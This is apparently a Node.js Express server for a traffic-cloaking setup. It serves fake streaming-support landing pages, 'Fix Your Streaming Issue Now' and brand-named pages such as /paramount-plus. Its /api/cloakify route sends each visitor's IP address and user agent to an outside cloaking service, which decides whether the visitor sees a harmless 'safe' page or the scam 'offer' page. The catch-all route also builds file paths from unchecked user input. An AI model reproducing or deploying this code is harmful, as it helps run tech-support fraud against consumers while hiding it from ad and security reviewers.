const express = require('express');
const path = require('path');
const https = require('https');
const app = express();

const PORT = process.env.PORT || 5000;

// Serve static files from public folder
app.use(express.static(path.join(__dirname, 'public')));

// Homepage
app.get('/', function(req, res) {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// /peacock — cloaker entry point
app.get('/peacock', function(req, res) {
  res.sendFile(path.join(__dirname, 'public', 'peacock.html'));
});

// /api/cloakify — server-side proxy to avoid CORS issues
app.post('/api/cloakify', function(req, res) {
  var body = '';
  req.on('data', function(chunk) { body += chunk; });
  req.on('end', function() {
    var options = {
      hostname: 'cloak.codingforfun.me',
      path: '/c/9360998c-9baa-46f1-ae8a-009b647d04e0',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body),
        'X-Forwarded-For': req.headers['x-forwarded-for'] || req.connection.remoteAddress,
        'User-Agent': req.headers['user-agent'] || ''
      }
    };
    var proxyReq = https.request(options, function(proxyRes) {
      var data = '';
      proxyRes.on('data', function(chunk) { data += chunk; });
      proxyRes.on('end', function() { res.json(JSON.parse(data)); });
    });
    proxyReq.on('error', function() {
      res.json({ decision: 'block' });
    });
    proxyReq.write(body);
    proxyReq.end();
  });
});

// /safe — Streaming Support & Help landing page
app.get('/safe', function(req, res) {
  res.sendFile(path.join(__dirname, 'public', 'safe.html'));
});

// /offer — Fix Your Streaming Issue Now landing page
app.get('/offer', function(req, res) {
  res.sendFile(path.join(__dirname, 'public', 'offer.html'));
});

// Clean URLs - /paramount-plus serves paramount-plus.html
app.get('/:page', function(req, res) {
  var page = req.params.page;
  var filePath = path.join(__dirname, 'public', page + '.html');
  res.sendFile(filePath, function(err) {
    if (err) {
      res.status(404).sendFile(path.join(__dirname, 'public', 'index.html'));
    }
  });
});

app.listen(PORT, '0.0.0.0', function() {
  console.log('Server running on port ' + PORT);
});
